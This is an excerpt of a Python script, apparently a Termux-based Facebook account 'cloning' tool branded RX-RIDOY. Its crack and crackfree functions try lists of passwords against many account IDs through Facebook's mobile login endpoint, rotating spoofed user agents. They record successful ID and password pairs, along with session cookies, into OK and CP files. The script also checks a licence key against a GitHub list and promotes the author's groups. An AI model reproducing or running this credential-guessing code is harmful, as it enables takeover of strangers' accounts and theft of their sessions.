...
time.sleep(2)
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY FACEBOOK GORUP")
os.system("espeak -a 300 \"JOIN,MY,FACEBOOK,GROUP\"")
os.system(f'xdg-open https://m.me/j/AbYX3L41fk0GVBpg/')
os.system("espeak -a 300 \"Enter,Username,and,password, \"")
#------------------[ RIDOY-KING ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36 [ip:151.34.243.2",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5808.215 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; A860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5768.206 Mobile Safari/537.36",]
...
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",]
...
ua = ["Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5767.210 Safari/537.36",]
ua = ["Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/115.0.5839.218 Chrome/115.0.5839.218 Safari/537.36",]
...
for xd in range(10000):
    ...
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/'
...
for x in range(10):
    ...
    i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/'
...
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/ewrridoyofficial')
logo = (f"""
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
...
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m CREATED BY \033[1;91m  :  \033[1;92mRX\033[1;91m-\033[1;92mRIDOY                    \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m FACEBOK\033[1;91m      : \033[1;92m RX\033[1;91m-\033[1;92mRIDOY\033[1;91m-\033[1;92mKING\033[1;91m-\033[1;92mBRO           \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m GITHUB\033[1;91m       :  \033[1;92mRX\033[1;91m-\033[1;92mRIDOY                    \033[1;91m|
...
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOL VIRSION\033[1;91m :  \033[1;35m[\033[1;32m\033[1;92m2.1\033[1;35m]                       \033[1;91m|
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
...
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m RX-RIDOY-TERMUX COMMUNITY 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●    \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/BOSS-JIBON/FILE-CLONE/blob/main/Approved.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      os.system("python RIDOY-2-1V.py")
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801612625557?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
os.system('espeak -a 300 " Welcome,   to,  RIDOY,  V I P,  Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    RIDOY = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if RIDOY in ['111']:
        login()
        dump_massal()
    elif RIDOY in ['1']:
        ...
        os.system('xdg-open https://wa.me/+8801605094328')
        os.system("python nono.py")
    elif RIDOY in ['3','03']:
        result()
    elif RIDOY in ['0']:
...
def setting():
    ...
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [\033[0;92mCookies Show \033[0;91m]")
    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
    print('\033[0;91m==================')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    #os.system("xdg-open https://www.facebook.com/RIDOY.King.Ok.Bro")
    if hc in ['1','01']:
...
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\x1b[1;96m╔══[•] \033[92;1\x1b[1;97m𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
    print("\x1b[1;96m║══[•] \033[10;93m𝚃𝙾𝙳𝙰𝚈'𝚂 𝙳𝙰𝚃𝙴 :\033[92;1m "+𝚍𝚊𝚝𝚎)
    print('\x1b[1;96m║══[•] \033[92;1m𝚈𝙾𝚄𝚁 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳𝚣 \033[0;97m:\033[92;1m ',str(len(id)))
    print("\x1b[1;96m║══[•] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \033[92;1m"+time.strftime("%H:%M")+" "+ tag)
    print("\x1b[1;96m║══[•] \033[95m𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚂𝙿𝙴𝙴𝙳 𝚂𝚄𝙿𝙴𝚁 𝙵𝙰𝚂𝚃-!💚")
    print(f'\x1b[1;96m╚══[•] \033[1;96m𝚄𝚂𝙴 𝙵𝙻𝙸𝙶𝙷𝚃 𝙼𝙾𝙳𝙴 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿 ')
    print('\x1b[1;96m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[RIDOY•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[RIDOY-Cp] {idf} • {pw}')
                print('\033[0;97m══════════════════════════════════════════════════════')
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mRIDOY-Ok💙\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print('\033[0;97m══════════════════════════════════════════════════════')
                os.system('espeak -a 300 " RIDOY,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[RIDOY-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mRIDOY-Cp🖤\033[1;91m] {idf} • {pw}')
                print('\033[0;97m══════════════════════════════════════════════════════')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•RIDOY-Ok💙] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\033[0;97m══════════════════════════════════════════════════════')
                os.system('espeak -a 300 " Ok,  RIDOY,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
